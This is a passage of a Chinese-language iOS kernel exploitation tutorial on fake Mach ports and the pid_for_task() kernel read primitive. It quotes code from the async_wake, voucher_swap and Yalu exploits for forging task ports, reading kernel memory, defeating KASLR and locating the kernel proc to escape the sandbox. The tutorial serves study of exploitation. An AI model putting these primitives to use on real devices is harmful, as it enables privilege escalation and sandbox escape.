class="meta">#<span class="keyword">define</span> IKOT_HOST_SECURITY     17</span></span><br><span class="line"><span class="number">110</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_LEDGER             18</span></span><br><span class="line"><span class="number">111</span>: <span class="meta">#<span class="keyword">define</span> IKOT_MASTER_DEVICE     19</span></span><br><span class="line"><span class="number">112</span>: <span class="meta">#<span class="keyword">define</span> IKOT_TASK_NAME         20</span></span><br><span class="line"><span class="number">113</span>: <span class="meta">#<span class="keyword">define</span> IKOT_SUBSYSTEM         21</span></span><br><span class="line"><span class="number">114</span>: <span class="meta">#<span class="keyword">define</span> IKOT_IO_DONE_QUEUE     22</span></span><br><span class="line"><span class="number">115</span>: <span class="meta">#<span class="keyword">define</span> IKOT_SEMAPHORE         23</span></span><br><span class="line"><span class="number">116</span>: <span class="meta">#<span class="keyword">define</span> IKOT_LOCK_SET          24</span></span><br><span class="line"><span class="number">117</span>: <span class="meta">#<span class="keyword">define</span> IKOT_CLOCK             25</span></span><br><span class="line"><span class="number">118</span>: <span class="meta">#<span class="keyword">define</span> IKOT_CLOCK_CTRL            26</span></span><br><span class="line"><span class="number">119</span>: <span class="meta">#<span class="keyword">define</span> IKOT_IOKIT_IDENT       27</span></span><br><span class="line"><span class="number">120</span>: <span class="meta">#<span class="keyword">define</span> IKOT_NAMED_ENTRY       28</span></span><br><span class="line"><span class="number">121</span>: <span class="meta">#<span class="keyword">define</span> IKOT_IOKIT_CONNECT     29</span></span><br><span class="line"><span class="number">122</span>: <span class="meta">#<span class="keyword">define</span> IKOT_IOKIT_OBJECT      30</span></span><br><span class="line"><span class="number">123</span>: <span class="meta">#<span class="keyword">define</span> IKOT_UPL               31</span></span><br><span class="line"><span class="number">124</span>: <span class="meta">#<span class="keyword">define</span> IKOT_MEM_OBJ_CONTROL       32</span></span><br><span class="line"><span class="number">125</span>: <span class="meta">#<span class="keyword">define</span> IKOT_AU_SESSIONPORT        33</span></span><br><span class="line"><span class="number">126</span>: <span class="meta">#<span class="keyword">define</span> IKOT_FILEPORT          34</span></span><br><span class="line"><span class="number">127</span>: <span class="meta">#<span class="keyword">define</span> IKOT_LABELH            35</span></span><br><span class="line"><span class="number">128</span>: <span class="meta">#<span class="keyword">define</span> IKOT_TASK_RESUME       36</span></span><br><span class="line"><span class="number">129</span>: <span class="meta">#<span class="keyword">define</span> IKOT_VOUCHER           37</span></span><br><span class="line"><span class="number">130</span>: <span class="meta">#<span class="keyword">define</span> IKOT_VOUCHER_ATTR_CONTROL  38</span></span><br><span class="line"><span class="number">131</span>: <span class="meta">#<span class="keyword">define</span> IKOT_WORK_INTERVAL              39</span></span><br><span class="line"><span class="number">132</span>: <span class="meta">#<span class="keyword">define</span> IKOT_UX_HANDLER                 40</span></span><br><span class="line"><span class="number">133</span>: </span><br><span class="line"><span class="number">134</span>: <span class="comment">/*</span></span><br><span class="line"><span class="comment">135:  * Add new entries here and adjust IKOT_UNKNOWN.</span></span><br><span class="line"><span class="comment">136:  * Please keep ipc/ipc_object.c:ikot_print_array up to date.</span></span><br><span class="line"><span class="comment">137:  */</span></span><br><span class="line"><span class="number">138</span>: <span class="meta">#<span class="keyword">define</span> IKOT_UNKNOWN                    41      <span class="comment">/* magic catchall       */</span></span></span><br><span class="line"><span class="number">139</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_MAX_TYPE   (IKOT_UNKNOWN+1)    <span class="comment">/* # of IKOT_ types */</span></span></span><br><span class="line"><span class="number">140</span>: </span><br><span class="line"><span class="number">141</span>: </span><br><span class="line"><span class="number">142</span>: <span class="meta">#<span class="keyword">define</span> is_ipc_kobject(ikot)   ((ikot) != IKOT_NONE)</span></span><br></pre></td></tr></table></figure>

<p>设置端口的io_bits示例代码如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IO_BITS_ACTIVE 0x80000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IKOT_TASK 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IKOT_CLOCK 25</span></span><br><span class="line"></span><br><span class="line">fakeport-&gt;io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;</span><br><span class="line">secondfakeport-&gt;io_bits = IKOT_TASK|IO_BITS_ACTIVE;</span><br></pre></td></tr></table></figure>

<p>ipc_object的io_references也需要被设置为不为0的值确保该对象不释放。</p>
<p>回到端口结构体，另一个重要成员是<code>struct ipc_space * receiver</code>，它指向ipc_space结构体。任务的ipc_space结构体定义其IPC功能。每个IPC功能都由一个ipc_entry表示，并放在一个表中，ipc_space结构体中的is_table指向该表。is_table中的端口权限或功能为16位，其名称实际上是is_table的索引。重要的是注意在内核中，端口权限(mach_port_t)通过传递指向适当的端口数据结构体(ipc_port_t)的指针来表示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> &#123;</span></span><br><span class="line">	<span class="type">lck_spin_t</span>	is_lock_data;</span><br><span class="line">	<span class="type">ipc_space_refs_t</span> is_bits;	<span class="comment">/* holds refs, active, growing */</span></span><br><span class="line">	<span class="type">ipc_entry_num_t</span> is_table_size;	<span class="comment">/* current size of table */</span></span><br><span class="line">	<span class="type">ipc_entry_num_t</span> is_table_free;	<span class="comment">/* count of free elements */</span></span><br><span class="line">	<span class="type">ipc_entry_t</span> is_table;		<span class="comment">/* an array of entries */</span></span><br><span class="line">	<span class="type">task_t</span> is_task;                 <span class="comment">/* associated task */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_table_size</span> *<span class="title">is_table_next</span>;</span> <span class="comment">/* info for larger table */</span></span><br><span class="line">	<span class="type">ipc_entry_num_t</span> is_low_mod;	<span class="comment">/* lowest modified entry during growth */</span></span><br><span class="line">	<span class="type">ipc_entry_num_t</span> is_high_mod;	<span class="comment">/* highest modified entry during growth */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bool_gen</span> <span class="title">bool_gen</span>;</span>       <span class="comment">/* state for boolean RNG */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> is_entropy[IS_ENTROPY_CNT]; <span class="comment">/* pool of entropy taken from RNG */</span></span><br><span class="line">	<span class="type">int</span> is_node_id;			<span class="comment">/* HOST_LOCAL_NODE, or remote node if proxy space */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>ipc_space是非常重要的结构体</strong>，因此，大多数EXP程序都会寻找内核ipc_space以便获得适当的(但仍为假的)内核任务端口。方法是将ipc_space_kernel复制到新的内存，并使假的端口的receiver指向该内存。</p>
<p>根据io_bits中设置的kobject类型，kobject指向不同的数据结构。因此如果伪造任务端口则需要将kobject指向struct task，如果是时钟，则指向struct clock。</p>
<p>async_wake EXP中相关的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span>* <span class="title function_">build_message_payload</span><span class="params">(<span class="type">uint64_t</span> dangling_port_address, <span class="type">uint32_t</span> message_body_size, <span class="type">uint32_t</span> message_body_offset, <span class="type">uint64_t</span> vm_map, <span class="type">uint64_t</span> receiver, <span class="type">uint64_t</span>** context_ptr)</span> &#123;</span><br><span class="line">  <span class="type">uint8_t</span>* body = <span class="built_in">malloc</span>(message_body_size);</span><br><span class="line">  <span class="built_in">memset</span>(body, <span class="number">0</span>, message_body_size);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> port_page_offset = dangling_port_address &amp; <span class="number">0xfff</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// structure required for the first fake port:</span></span><br><span class="line">  <span class="type">uint8_t</span>* fake_port = body + (port_page_offset - message_body_offset);</span><br><span class="line"></span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;</span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = <span class="number">0xf00d</span>; <span class="comment">// leak references</span></span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = <span class="number">0xf00d</span>; <span class="comment">// leak srights</span></span><br><span class="line">  *(<span class="type">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;</span><br><span class="line">  *(<span class="type">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = <span class="number">0x123456789abcdef</span>;</span><br><span class="line"></span><br><span class="line">  *context_ptr = (<span class="type">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the kobject pointer such that task-&gt;bsd_info reads from ip_context:</span></span><br><span class="line">  <span class="type">int</span> fake_task_offset = koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT) - koffset(KSTRUCT_OFFSET_TASK_BSD_INFO);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> fake_task_address = dangling_port_address + fake_task_offset;</span><br><span class="line">  *(<span class="type">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_address;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// when we looked for a port to make dangling we made sure it was correctly positioned on the page such that when we set the fake task</span></span><br><span class="line">  <span class="comment">// pointer up there it&#x27;s actually all in the buffer so we can also set the reference count to leak it, let&#x27;s double check that!</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fake_port + fake_task_offset &lt; body) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the maths is wrong somewhere, fake task doesn&#x27;t fit in message\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span>* fake_task = fake_port + fake_task_offset;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the ref_count field of the fake task:</span></span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = <span class="number">0xd00d</span>; <span class="comment">// leak references</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// make sure the task is active</span></span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the vm_map of the fake task:</span></span><br><span class="line">  *(<span class="type">uint64_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the task lock type of the fake task&#x27;s lock:</span></span><br><span class="line">  *(<span class="type">uint8_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = <span class="number">0x22</span>;</span><br><span class="line">  <span class="keyword">return</span> body;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>拓展知识：<a target="_blank" rel="noopener" href="https://papers.put.as/papers/ios/2017/cansecwest2017stefanesserportaltotheioscore.pdf">CanSecWest 2017 - Port(al) to the iOS Core</a></p>
</blockquote>
<h3 id="pid-for-task-任意读取"><a href="#pid-for-task-任意读取" class="headerlink" title="pid_for_task()任意读取"></a>pid_for_task()任意读取</h3><p>如前所述，pid_for_task()将给出相应任务的PID。假设p_pid的偏移量为0x10，并且假设要读取的地址为addr，则可以创建一个伪造端口，然后将其关联到假的任务，使得该任务中的bsd_info为addr-0x10。</p>
<p>下面是voucher_swap EXP中相关的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stage1_read32</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *  Read a 32-bit value from kernel memory using our fake port.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  This primitive requires that we know the address of the pipe buffer containing our port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span></span><br><span class="line"><span class="title function_">stage1_read32</span><span class="params">(<span class="type">uint64_t</span> address)</span> &#123;</span><br><span class="line">  <span class="comment">// Do a read to make the pipe available for a write.</span></span><br><span class="line">  read_pipe();</span><br><span class="line">  <span class="comment">// Create our fake task. The task&#x27;s proc&#x27;s p_pid field overlaps with the address we want to</span></span><br><span class="line">  <span class="comment">// read.</span></span><br><span class="line">  <span class="type">uint64_t</span> fake_proc_address = address - OFFSET(proc, p_pid);</span><br><span class="line">  <span class="type">uint64_t</span> fake_task_address = pipe_buffer_address + fake_task_offset;</span><br><span class="line">  <span class="type">uint8_t</span> *fake_task = (<span class="type">uint8_t</span> *) pipe_buffer + fake_task_offset;</span><br><span class="line">  FIELD(fake_task, task, ref_count, <span class="type">uint64_t</span>) = <span class="number">2</span>;</span><br><span class="line">  FIELD(fake_task, task, bsd_info,  <span class="type">uint64_t</span>) = fake_proc_address;</span><br><span class="line">  <span class="comment">// Initialize the port as a fake task port pointing to our fake task.</span></span><br><span class="line">  <span class="type">uint8_t</span> *fake_port_data = (<span class="type">uint8_t</span> *) pipe_buffer + fake_port_offset;</span><br><span class="line">  FIELD(fake_port_data, ipc_port, ip_bits,    <span class="type">uint32_t</span>) = io_makebits(<span class="number">1</span>, IOT_PORT, IKOT_TASK);</span><br><span class="line">  FIELD(fake_port_data, ipc_port, ip_kobject, <span class="type">uint64_t</span>) = fake_task_address;</span><br><span class="line">  <span class="comment">// Write our buffer to kernel memory.</span></span><br><span class="line">  write_pipe();</span><br><span class="line">  <span class="comment">// Now use pid_for_task() to read our value.</span></span><br><span class="line">  <span class="type">int</span> pid = <span class="number">-1</span>;</span><br><span class="line">  <span class="type">kern_return_t</span> kr = pid_for_task(fake_port, &amp;pid);</span><br><span class="line">  <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">    ERROR(<span class="string">&quot;%s returned %d: %s&quot;</span>, <span class="string">&quot;pid_for_task&quot;</span>, kr, mach_error_string(kr));</span><br><span class="line">    ERROR(<span class="string">&quot;could not read kernel memory in stage %d using %s&quot;</span>, <span class="number">1</span>, <span class="string">&quot;pid_for_task&quot;</span>);</span><br><span class="line">    fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">uint32_t</span>) pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用两次就可以读取64bit：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stage1_read64</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *  Read a 64-bit value from kernel memory using our stage 1 read primitive.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span></span><br><span class="line"><span class="title function_">stage1_read64</span><span class="params">(<span class="type">uint64_t</span> address)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> value32[<span class="number">2</span>];</span><br><span class="line">    <span class="type">uint64_t</span> value64;</span><br><span class="line">  &#125; u;</span><br><span class="line">  u.value32[<span class="number">0</span>] = stage1_read32(address);</span><br><span class="line">  u.value32[<span class="number">1</span>] = stage1_read32(address + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> u.value64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意偏移量会随着iOS版本以及设备的不同而变化。这些偏移量既可以通过查看内核源代码来找到，也可以通过查看kernelcache文件来找到。</p>
<p>此技术非常强大，可一次读取4个字节的内核内存。还可以用该函数找到内核偏移。需要做的仅仅是每次向后读取四个字节的内核内存，直到获得魔术值0xfeedfacf为止。该地址是内核基地址，减去用IDA或Hopper打开kernelcache时的起始地址就得到了偏移量。</p>
<p>下面是Yalu EXP中相关的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int32_t</span> leaked = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// The offset from the start of &quot;struct task&quot; to &quot;task-&gt;bsd_info&quot; seems to be fixed to 0x360, but this is prone to change anytime in the future as apple sees fit</span></span><br><span class="line">        <span class="comment">// It&#x27;d be nice to use a heuristic method like how K33n Team does it with the cpu_clock thing</span></span><br><span class="line">        *(<span class="type">uint64_t</span>*) (faketask + procoff) = leaked_ptr - <span class="number">0x10</span>;</span><br><span class="line">        <span class="comment">// This tries to read a value from &quot;task-&gt;bsd_info-&gt;p_pid&quot; which translates to &quot;faketask-&gt;bsd_info-&gt;p_pid = (leaked_ptr - 0x10)-&gt;p_pid = leaked_ptr&quot;</span></span><br><span class="line">        pid_for_task(foundport, &amp;leaked);</span><br><span class="line">        <span class="comment">// Is it 0xfeedfacf?</span></span><br><span class="line">        <span class="keyword">if</span> (leaked == MH_MAGIC_64) &#123;</span><br><span class="line">            NSLog(@<span class="string">&quot;found kernel text at %llx&quot;</span>, leaked_ptr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Retreat one page and search again</span></span><br><span class="line">        leaked_ptr -= <span class="number">0x4000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// Found kernel base!</span></span><br><span class="line"><span class="type">uint64_t</span> kernel_base = leaked_ptr;</span><br><span class="line">.....................</span><br><span class="line">.....................</span><br><span class="line"><span class="comment">// Calculating KASLR slide</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint64_t</span> slide;</span><br><span class="line">slide = kernel_base - <span class="number">0xFFFFFFF007004000</span>;</span><br></pre></td></tr></table></figure>

<p>获得了内核基地址就可以在内核内存中找到一些重要的结构体，例如<code>extern struct proclist allproc;</code>。可以在<code>/bsd/sys/proc_internal.h</code>中找到它。即使存在KASLR，它相对内核基地址的偏移总是固定的。正如我们从内核代码中看到的那样，该结构体包含进程的列表。也可以使用<code>jtool2 –analyze</code>命令找到符号地址，因为Apple错误地发布了含有符号的kernelcache。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">lck_grp_attr_t</span> * proc_lck_grp_attr;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">lck_attr_t</span> * proc_lck_attr;</span><br><span class="line"></span><br><span class="line">LIST_HEAD(proclist, proc);</span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">proclist</span> <span class="title">allproc</span>;</span>		<span class="comment">/* List of all processes. */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">proclist</span> <span class="title">zombproc</span>;</span>	<span class="comment">/* List of zombie processes. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">initproc</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span>	<span class="title function_">procinit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_lock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_unlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_spinlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_spinunlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_list_lock</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_list_unlock</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_klist_lock</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_klist_unlock</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_fdlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_fdlock_spin</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_fdunlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_fdlock_assert</span><span class="params">(<span class="type">proc_t</span> p, <span class="type">int</span> assertflags)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_ucred_lock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_ucred_unlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br></pre></td></tr></table></figure>

<p>然后，可以再次使用pid_for_task()来遍历这些结构体，通过检查pid&#x3D;getpid()找到当前proc结构体(这样我们以后可以更改当前proc的cred以逃逸沙盒)，并通过检查pid&#x3D;0来找到内核proc结构体(这样我们就可以获得内核proc的cred，找到kernel task，ipc_space_kernel等)。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// extern struct proclist allproc;</span></span><br><span class="line"><span class="comment">// This global variable stores the start of the linked_list of all proc objects</span></span><br><span class="line"><span class="type">uint64_t</span> allproc = allproc_offset + kernel_base;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> proc_ = allproc;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> myproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> kernproc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Traverse the linked list until the end of the list. I guess the next pointer of the last element is set to 0</span></span><br><span class="line"><span class="keyword">while</span> (proc_) &#123;</span><br><span class="line">    <span class="type">uint64_t</span> proc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getting the address of the next proc object in the linked list</span></span><br><span class="line">    *(<span class="type">uint64_t</span>*) (faketask + procoff) = proc_ - <span class="number">0x10</span>;</span><br><span class="line">    pid_for_task(foundport, (<span class="type">int32_t</span>*)&amp;proc);</span><br><span class="line">    <span class="comment">// Need to read 2 times cause &quot;pid_for_task&quot; can only read 4 bytes at a time</span></span><br><span class="line">    *(<span class="type">uint64_t</span>*) (faketask + procoff) = <span class="number">4</span> + proc_ - <span class="number">0x10</span>;</span><br><span class="line">    pid_for_task(foundport, (<span class="type">int32_t</span>*)(((<span class="type">uint64_t</span>)(&amp;proc)) + <span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getting the PID of from proc-&gt;p_pid</span></span><br><span class="line">    <span class="type">int</span> pd = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*) (faketask + procoff) = proc;</span><br><span class="line">    pid_for_task(foundport, &amp;pd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Checking if it equals my PID</span></span><br><span class="line">    <span class="keyword">if</span> (pd == getpid()) &#123;</span><br><span class="line">        <span class="comment">// Address of my proc struct</span></span><br><span class="line">        myproc = proc;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pd == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// Address of the kernel proc struct</span></span><br><span class="line">        kernproc = proc;</span><br><span class="line">    &#125;</span><br><span class="line">    proc_ = proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="堆分配基础"><a href="#堆分配基础" class="headerlink" title="堆分配基础"></a>堆分配基础</h3><p>在iOS中，堆内存分为多个zone。相同大小的分配使用相同的zone，除非某些对象具有自己的特殊zone(ports，vouchers等)。这些zone随着分配对象增多而增长，并且从zone map中获得新页。在macOS上，可以使用zprint命令看到分配的zone。许多堆分配技术在iOS中仍然相同。另一件事是要注意，iOS也具有zone垃圾回收。</p>
<p><img src="https://highaltitudehacks.com/images/30.png" alt="30"></p>
